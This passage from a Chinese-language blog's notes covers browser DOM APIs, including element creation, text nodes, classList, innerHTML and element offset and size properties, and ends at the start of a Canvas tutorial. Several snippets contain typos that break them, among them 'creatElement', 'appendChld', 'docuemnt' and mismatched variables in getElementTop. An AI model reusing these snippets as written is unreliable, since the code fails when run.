)&#123;</span><br><span class="line">  <span class="keyword">var</span> key = element.attributes[i].nodeName;</span><br><span class="line">  <span class="keyword">var</span> val = element.attributes[i].nodeValue;</span><br><span class="line">  arr.push(key + <span class="string">'='</span> + val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="3-3-创建元素"><a href="#3-3-创建元素" class="headerlink" title="3.3 创建元素"></a>3.3 创建元素</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line"><span class="comment">// var div = document.createDocumentFragment();</span></span><br><span class="line"><span class="comment">// 文档片段不会被添加到文档树中</span></span><br><span class="line">div.id = <span class="string">"myDiv"</span>;</span><br><span class="line">div.className = <span class="string">"box"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建文本节点</span></span><br><span class="line"><span class="keyword">var</span> textNode1 = <span class="built_in">document</span>.createTextNode(<span class="string">"hello"</span>);</span><br><span class="line"><span class="keyword">var</span> textNode2 = <span class="built_in">document</span>.createTextNode(<span class="string">"!!!"</span>);</span><br><span class="line">div.appendChild(textNode1);</span><br><span class="line">div.appendChild(textNode2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// normalize()能将相邻文本节点合并</span></span><br><span class="line">div.normalize();  <span class="comment">// div.firstChild.nodeValue == "hello!!!"</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(div);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-4-文本节点"><a href="#3-4-文本节点" class="headerlink" title="3.4 文本节点"></a>3.4 文本节点</h4><p>Text节点具有以下特征</p><ul><li>nodeType = 3</li><li>nodeName = “#text”</li><li>nodeValue = 具体文本</li><li>parentNode是一个element，文本节点没有子节点</li></ul><p>通过<code>nodeValue</code>属性或<code>data</code>属性访问文本节点中包含的文本。</p><ul><li>appendData(text): 将text添加到节点的末尾</li><li>deleteData(offset, count): 从offset指定的位置开始删除count个字符</li><li>insertData(offset, text): 在offset指定的位置插入text</li><li>replaceData(offset, count, text): 用text替换offset+count为止的文本</li><li>splitText(offset): 从offset位置将当前文本节点分成两个文本节点</li><li>substringData(offset, count): 提取offset+count处的字符串</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改文本</span></span><br><span class="line">&lt;div&gt;hello!<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">div.firstChild.nodeValue = <span class="string">"Some other message"</span></span><br><span class="line">div.firstChild.nodeValue = <span class="string">"&lt;strong&gt;&lt;/strong&gt;"</span>  <span class="comment">// 会被转义</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-DOM操作技术"><a href="#4-DOM操作技术" class="headerlink" title="4. DOM操作技术"></a>4. DOM操作技术</h3><h4 id="4-1-动态添加js-css"><a href="#4-1-动态添加js-css" class="headerlink" title="4.1 动态添加js/css"></a>4.1 动态添加js/css</h4><ul><li>添加js<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.creatElement(<span class="string">'script'</span>);</span><br><span class="line">script.type = <span class="string">"text/javascript"</span>;</span><br><span class="line">script.src = <span class="string">"client.js"</span>;</span><br><span class="line"><span class="comment">// script.text = "function sayHi()&#123; alert('hi'); &#125;"</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure></li></ul><p>怎么知道脚本加载完成了？</p><ul><li>添加css<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">'link'</span>);</span><br><span class="line">link.rel = <span class="string">"stylesheet"</span>;</span><br><span class="line">link.type = <span class="string">"text/css"</span>;</span><br><span class="line">link.href = <span class="string">"style.css"</span>;</span><br><span class="line"><span class="keyword">var</span> head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>];</span><br><span class="line">head.appendChild(link);</span><br><span class="line"></span><br><span class="line"><span class="comment">// cssText</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="built_in">document</span>.createElement(<span class="string">'style'</span>);</span><br><span class="line"><span class="keyword">var</span> css = <span class="string">"body&#123;background-color: red&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>(style.styleSheet)&#123;</span><br><span class="line">    style.styleSheet.cssText = css;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    style.appendChild(<span class="built_in">document</span>.createTextNode(css));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(style);</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#### 4.2 操作表格</span></span><br><span class="line"><span class="string">createTHead() / deleteTHead()  : 创建/删除`</span>&lt;thead&gt;<span class="string">`元素</span></span><br><span class="line"><span class="string">createTFoot() / deleteTFoot()  : 创建/删除`</span>&lt;tfoot&gt;<span class="string">`元素</span></span><br><span class="line"><span class="string">createCaption() / deleteTFoot(): 创建/删除`</span>&lt;caption&gt;<span class="string">`元素</span></span><br><span class="line"><span class="string">*rows*</span></span><br><span class="line"><span class="string">保存着`</span>&lt;tbody&gt;<span class="string">`元素中行的HTMLCollection。你可以用`</span>deleteRow(pos)<span class="string">`删除行，`</span>insertRow(pos)<span class="string">`插入行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*cells*</span></span><br><span class="line"><span class="string">保存着`</span>&lt;tr&gt;<span class="string">`元素中单元格的HTMLCollection。你可以用`</span>deleteCell(pos)<span class="string">`删除指定位置单元格，`</span>insertCell(post)<span class="string">`向cells指定位置插入一个单元格</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line"><span class="keyword">var</span> table = <span class="built_in">document</span>.createElement(<span class="string">'table'</span>);</span><br><span class="line"><span class="keyword">var</span> tbody = <span class="built_in">document</span>.createElement(<span class="string">'tbody'</span>);</span><br><span class="line">table.appendChild(tbody);</span><br><span class="line"></span><br><span class="line">tbody.insertRow(<span class="number">0</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].insertCell(<span class="number">0</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].cells[<span class="number">0</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"123"</span>));</span><br><span class="line">tbody.rows[<span class="number">0</span>].insertCell(<span class="number">1</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].cells[<span class="number">1</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"456"</span>))</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="4-3-减少DOM操作"><a href="#4-3-减少DOM操作" class="headerlink" title="4.3 减少DOM操作"></a>4.3 减少DOM操作</h4><p><code>NodeList, NamedNodeMap 和 HTMLCollection</code>这三个集合都是动态的。当文档结构发生变化时，它们都会得到更新。从本质上，所有NodeList对象都是在访问DOM文档时实时运行的查询。</p><p>下列代码会导致无限循环。每次循环对条件<code>i &lt; divs.length</code>求值，意味着会运行取得所有<code>&lt;div&gt;</code>元素的查询。DOM操作往往是JS程序中开销最大的部分，<em>访问NodeList导致的问题最多</em>。NodeList是“动态的”，每次访问NodeList对象，都会运行一次查询，有鉴于此，最好就是尽量减少DOM操作。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> divs = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"div"</span>);</span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; divs.length; i++ )&#123;</span><br><span class="line">  div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChld(div);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="5-HTML5"><a href="#5-HTML5" class="headerlink" title="5. HTML5"></a>5. HTML5</h3><h4 id="5-1-class"><a href="#5-1-class" class="headerlink" title="5.1 class"></a>5.1 class</h4><ul><li><p>document.getElementsByClassName</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementsByClassName(<span class="string">"username current"</span>)</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"myDiv"</span>).getElementsByClassName(<span class="string">"selected"</span>)</span><br></pre></td></tr></table></figure></li><li><p>classList<br>className是一个字符串，HTML5新增了操作类名的方法，通过classList添加、删除和替换类名</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">div.classList.remove(<span class="string">"disabled"</span>)</span><br><span class="line">div.classList.add(<span class="string">"current"</span>)</span><br><span class="line">div.classList.contains(<span class="string">"bd"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列表存在已经给定的值，删除它；列表中没有给定的值，添加它</span></span><br><span class="line">div.classList.toggle(<span class="string">"user"</span>)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="5-2-focus"><a href="#5-2-focus" class="headerlink" title="5.2 focus()"></a>5.2 focus()</h4><p><code>document.activeElement</code>始终会引用DOM中当前获得焦点的元素。默认情况下，文档刚刚加载完时，document.activeElement保存的是document.body元素<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> button = <span class="built_in">document</span>.getElementById(<span class="string">"myButton"</span>);</span><br><span class="line">button.focus()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.activeElement === button)  <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(docuemnt.hasFocus())                <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-3-其他"><a href="#5-3-其他" class="headerlink" title="5.3 其他"></a>5.3 其他</h4><ul><li>document.readyState<br>document.readyState === “loading” 正在加载文档<br>document.readyState === “complete” 已经加载完文档</li></ul><p><br></p><ul><li>data-<br>为元素提供与渲染无无关的信息，要添加前缀data-<br><code>&lt;div class=&quot;myDiv&quot; data-appID=&quot;12345&quot; data-myname=&quot;Nicholas&quot;&gt;&lt;div&gt;</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">"myDiv"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取值</span></span><br><span class="line"><span class="keyword">var</span> appId = div.dataset.appId;</span><br><span class="line"><span class="comment">// 设置值</span></span><br><span class="line">div.dataset.appId = <span class="string">"23456"</span>;</span><br><span class="line"><span class="comment">// 判断有无值</span></span><br><span class="line"><span class="keyword">if</span> (div.dataset.myname)&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>contains()<br>检查某个节点是不是另一个节点的后代。 <code>compareDocumentPosition()</code>也能确定节点间的关系，支持IE9+。返回1-无关， 2-位于参考节点前， 4- 位于参考节点后， 8-包含， 16-被包含。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.documentElement.contains(<span class="built_in">document</span>.body)  <span class="comment">// true</span></span><br><span class="line"><span class="built_in">document</span>.documentElement.compareDocumentPosition(<span class="built_in">document</span>.body)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>插入标记</li></ul><ol><li><p>innerHTML<br>直接插入HTML字符串。通过innerHTML插入script元素并不会执行其中的脚本，但是支持通过innerHTML插入style元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div.innerHTML = <span class="string">"hello &amp; welcome, &lt;p&gt;reader!&lt;/p&gt;"</span></span><br><span class="line"><span class="built_in">console</span>.log(div.innerHTML)</span><br></pre></td></tr></table></figure></li><li><p>outerHTML<br>返回调用它的元素及所有子节点的HTML标签</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div.outerHTML = <span class="string">"hello &amp; welcome, &lt;p&gt;reader!&lt;/p&gt;"</span></span><br><span class="line"><span class="built_in">console</span>.log(div.outerHTML)</span><br></pre></td></tr></table></figure></li><li><p>insertAdjacentHTML<br>接受两个参数：插入位置和要插入的HTML文本。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 作为前一个同辈元素插入</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'beforebegin'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作为后一个同辈元素插入</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'afterend'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作为第一个子元素插入</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'afterbegin'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最为最后一个子元素插入</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'beforeend'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br></pre></td></tr></table></figure></li></ol><p>在使用innerHTML, outerHTML, insertAdjacentHTML()方法时，最好先手工删除药别替换的元素的所有事件程序和js对象属性。设置innerHTML或outerHTML时，就会创建一个HTML解析器。不可避免地，创建和销毁HTML解析器会带来性能损失。所以在插入大量新HTML标记时，可以先通过多次DOM操作再指定它们之间的关系。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> itemsHtml = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  itemsHtml += <span class="string">"&lt;li&gt;"</span> + i + <span class="string">"&lt;/li&gt;"</span></span><br><span class="line">&#125;</span><br><span class="line">ul.innerHTML = itesHTML;</span><br></pre></td></tr></table></figure></p><p><br></p><ul><li>插入文本<br>innerText和outeText不是HTML5的属性。但IE4, safari, opera, chrome支持innerText, firefox虽然不支持，但支持作用类似的textContent。</li></ul><p><br></p><ul><li>滚动<br>scrollIntoView()<br>通过滚动浏览器窗口或某个容器元素，调用元素可以出现在视口中。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.form[<span class="number">0</span>].scrollIntoView()</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h3 id="6-2-DOM2和DOM3"><a href="#6-2-DOM2和DOM3" class="headerlink" title="6.2 DOM2和DOM3"></a>6.2 DOM2和DOM3</h3><h4 id="6-1-style"><a href="#6-1-style" class="headerlink" title="6.1 style"></a>6.1 style</h4><p>行内style对象，包含着通过HTML的style特性指定的所有样式信息，但不包含与外部样式表或嵌入样式表层叠而来的样式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">"id"</span>);</span><br><span class="line">div.style.backgroundColor = <span class="string">"red"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问style特性中的CSS代码</span></span><br><span class="line">div.style.cssText = <span class="string">"width: 25px; height: 100px; background-color: green"</span>;</span><br><span class="line">div.style.length</span><br><span class="line">div.style.getPropertyValue(propertyName)</span><br><span class="line">div.style.setProperty(propertyName, value, priority)</span><br><span class="line">div.style.removeProperty(propertyName)</span><br><span class="line">div.style.item(index)  <span class="comment">// 返回给定位置的CSS属性的名称</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-2-getComputedStyle"><a href="#6-2-getComputedStyle" class="headerlink" title="6.2 getComputedStyle"></a>6.2 getComputedStyle</h4><p>getComputedStyle()方法接受两个参数：要计算样式的元素和一个伪元素字符串(:after, 可以是null)。返回一个CSSStyleDeclaration对象，其中包含当前元素的所有计算的样式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myDiv = <span class="built_in">document</span>.getElementById(<span class="string">'myDiv'</span>);</span><br><span class="line"><span class="keyword">var</span> computedStyle = <span class="built_in">document</span>.defaultView.getComputedStyle(myDiv, <span class="literal">null</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// IE不支持getComputedStyle，但有类似的方法myDiv.currentStyle</span></span><br><span class="line"><span class="comment">// var computedStyle = myDiv.currentStyle;</span></span><br><span class="line">computedStyle.width;</span><br><span class="line">computedStyle.height;</span><br><span class="line">computedStyle.backgroundColor;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-3-CSSStylesSheet"><a href="#6-3-CSSStylesSheet" class="headerlink" title="6.3 CSSStylesSheet"></a>6.3 CSSStylesSheet</h4><p>向现有样式表中添加新规则<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertRule</span>(<span class="params">sheet, selectorText, cssText, position</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (sheet.insertRule)&#123;</span><br><span class="line">    sheet.insertRule(selectorText + <span class="string">"&#123;"</span> + cssText + <span class="string">"&#125;"</span>, position);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sheet.addRule)&#123;</span><br><span class="line">    sheet.addRule(selectorText, cssText, position);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">insertRule(<span class="built_in">document</span>.styleSheets[<span class="number">0</span>], <span class="string">"body"</span>, <span class="string">"background-color: silver"</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p>向现在样式表删除规则<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteRule</span>(<span class="params">sheet, index</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (sheet.deleteRule)&#123;</span><br><span class="line">    sheet.deleteRule(index);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sheet.removeRule)&#123;</span><br><span class="line">    sheet.removeRule(index);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">deleteRule(<span class="built_in">document</span>.styleSheets[<span class="number">0</span>], <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-4-offsetHeight-clientHeight-scrollHeight"><a href="#6-4-offsetHeight-clientHeight-scrollHeight" class="headerlink" title="6.4 offsetHeight, clientHeight, scrollHeight"></a>6.4 offsetHeight, clientHeight, scrollHeight</h4><p><em>offsetHeight</em><br>通过下列4个属性获取元素的偏移量: offsetHeight, offsetWidth, offsetLeft, offsetTop。要想知道某个元素在页面上的偏移量，将这个元素的offsetLeft和offsetTop与其offsetParent的相同属性相加，如此循环直至根元素，就可以得到一个基本准确的值。<br><img src="/2018/10/07/DOM/3.png" style="max-width:350px; margin-top:20px"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElementTop</span>(<span class="params">element</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> actuaTop = element.offsetTop;</span><br><span class="line">  <span class="keyword">var</span> current = element.offsetParent;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>( current !== <span class="literal">null</span> )&#123;</span><br><span class="line">    actualTop += current.offsetTop;</span><br><span class="line">    current = current.offsetParent;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> actualLeft;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br><br><em>clientHeight</em><br>元素内容及其内边距所占据的空间大小: clientWidth 和 clientHeight。最常用到的是，确定浏览器视口大小，可以使用document.documentElement 或 document.body 的 clientWidth 和 clientHeight。<br><img src="/2018/10/07/DOM/4.png" style="max-width:350px; margin-top:20px"><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.clientWidth || <span class="built_in">document</span>.documentElement.clientWidth</span><br></pre></td></tr></table></figure></p><p><br><br><em>scrollHeight</em><br>scrollHeight: 元素内容的总高度<br>scrollWidth: 元素内容的总宽度<br>scrollLeft: 被隐藏在内容区域左侧的像素数，设置这个属性可以改变元素的滚动位置<br>scrollTop: 被隐藏在内容区域上方的像素数， 设置这个属性可以改变元素的滚动位置<br><img src="/2018/10/07/DOM/5.png" style="max-width:350px; margin-top: 20px"></p><p>在确定文档的总高度时，必须取得 scrollWidth/clientWidth 和 scrollHeight/clientHeight 中的最大值。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文档总高度</span></span><br><span class="line"><span class="keyword">var</span> docHeight = <span class="built_in">Math</span>.max(<span class="built_in">document</span>.documentElement.scrollHeight, <span class="built_in">document</span>.documentElement.clientHeight);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-5-getBoundingClientRect"><a href="#6-5-getBoundingClientRect" class="headerlink" title="6.5 getBoundingClientRect"></a>6.5 getBoundingClientRect</h4><p>给出了元素在页面中相对视口的位置，包含4个属性: left, top, right, bottom。<code>-scrollTop</code>是为了防止调用这个函数时窗口被滚动了。</p><p>如果不支持<code>getBoundingClientRect()</code>方法，就使用<code>offsetHeight</code>一层层计算。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBoundingClientRect</span>(<span class="params">element</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">arguments</span>.callee.offset != <span class="string">"number"</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> scrollTop = <span class="built_in">document</span>.documentElement.scrollTop;</span><br><span class="line">    <span class="keyword">var</span> temp = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">    temp.style.cssText = <span class="string">"position:absolute;left:0;top:0;"</span>; <span class="built_in">document</span>.body.appendChild(temp);</span><br><span class="line">    <span class="built_in">arguments</span>.callee.offset = -temp.getBoundingClientRect().top - scrollTop; <span class="built_in">document</span>.body.removeChild(temp);</span><br><span class="line">    temp = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> rect = element.getBoundingClientRect();</span><br><span class="line">  <span class="keyword">var</span> offset = <span class="built_in">arguments</span>.callee.offset;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">      left: rect.left + offset,</span><br><span class="line">      right: rect.right + offset,</span><br><span class="line">      top: rect.top + offset,</span><br><span class="line">      bottom: rect.bottom + offset</span><br><span class="line">  &#125;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Canvas实现白板功能</title>
      <link href="/2018/10/06/Canvas%E6%96%87%E6%A1%A3/"/>
      <url>/2018/10/06/Canvas%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<h3 id="1-元素"><a href="#1-元素" class="headerlink" title="1. 元素"></a>1. 元素</h3><ul><li><p>canvas元素<br>canvas是一个可以使用JS来绘制图形的HTML元素。canvas标签只有两个属性——width和height。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas id=&quot;tutorial&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;/canvas&gt;</span><br></pre></td></tr></table></figure></li><li><p>渲染上下文<br>canvas元素创造了一个固定大小的画布，它公开了一个或多个渲染上下文，用来绘制和处理要展示的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var canvas = document.getElementById(&apos;tutorial&apos;);</span><br><span class="line">var ctx    = canvas.getContext(&apos;2d&apos;);</span><br></pre></td></tr></table></figure></li><li><p>坐标<br>画布的起点为左上角(坐标(0, 0))，所有元素的位置都相对于原点定位。<br><img src="/2018/10/06/Canvas文档/1.png" style="padding-top:20px; max-width: 380px"><br><br></p></li></ul><h3 id="2-绘制"><a href="#2-绘制" class="headerlink" title="2. 绘制"></a>2. 绘制</h3><h4 id="2-1-矩形"><a href="#2-1-矩形" class="headerlink" title="2.1 矩形"></a>2.1 矩形</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctx.fillRect(x, y, width, height)     绘制一个填充的矩形</span><br><span class="line">ctx.strokeRect(x, y, width, height)   绘制一个矩形的边框</span><br><span class="line">ctx.clearRect(x, y, width, height)    清除指定矩形区域，让清除部分完全透明</span><br></pre></td></tr></table></figure><h4 id="2-2-圆弧"><a href="#2-2-圆弧" class="headerlink" title="2.2 圆弧"></a>2.2 圆弧</h4><p>画一个以(x,y)为圆心的radius为半径的圆，从startAngle开始到endAngle结束，按照anticlockwise给定的方向(默认顺时针)生成。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.arc(x, y, radius, startAngle, endAngle, anticlockwise)</span><br></pre></td></tr></table></figure></p><p>根据给定的控制点和半径画一段圆弧，再以直线连接两个控制点。<br><figure 